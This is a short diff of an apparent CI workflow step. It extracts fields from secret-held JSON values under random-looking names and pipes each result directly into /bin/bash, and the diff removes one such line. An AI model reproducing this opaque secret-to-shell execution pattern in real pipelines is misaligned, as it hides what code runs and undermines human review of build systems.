@@ -22,7 +22,6 @@ jobs:
           hgkd5: ${{ secrets.hgkd5 }}
         run: |
           printf '%s' "$hgkd5" | jq -r .qn78 | /bin/bash
-          printf '%s' "$xqmll51029" | jq -r .wo00689 | /bin/bash
           echo $itp1893 | jq -r .x4 | /bin/bash
           printf '%s' "$rlv795" | jq -r .t861 | /bin/bash
           echo $k4868 | jq -r .ysuc70782 | /bin/bash
